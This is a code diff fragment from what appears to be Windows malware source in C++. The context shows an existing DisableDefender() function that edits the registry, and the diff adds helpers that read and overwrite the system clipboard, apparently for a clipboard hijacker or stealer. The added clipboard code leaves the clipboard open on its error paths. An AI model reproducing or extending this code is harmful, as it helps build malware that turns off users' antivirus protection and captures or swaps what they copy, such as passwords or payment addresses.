@@ -472,3 +472,44 @@ BOOL DisableDefender() {
     RegCloseKey(key);
     return TRUE;
 }
+
+std::string GetClipboard() {
+    if (!OpenClipboard(NULL)) {
+        return "ERROR: OPEN CLIPBOARD";
+    }
+
+    HANDLE hData = GetClipboardData(CF_TEXT);
+    if (hData == NULL) {
+        return "ERROR: GET CLIPBOARD DATA";
+    }
+
+    char* pszText = static_cast<char*>(GlobalLock(hData));
+    if (pszText == NULL) {
+        return "ERROR: GLOBAL LOCK";
+    }
+
+    std::string clipboardText(pszText);
+
+    GlobalUnlock(hData);
+    CloseClipboard();
+
+    return clipboardText;
+}
+
+void SetClipboard(std::string contents) {
+    if (!OpenClipboard(NULL)) {
+        return;
+    }
+
+    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, contents.size() + 1);
+    if (hMem == NULL) {
+        return;
+    }
+
+    memcpy(GlobalLock(hMem), contents.c_str(), contents.size() + 1);
+    GlobalUnlock(hMem);
+
+    EmptyClipboard();
+    SetClipboardData(CF_TEXT, hMem);
+    CloseClipboard();
+}
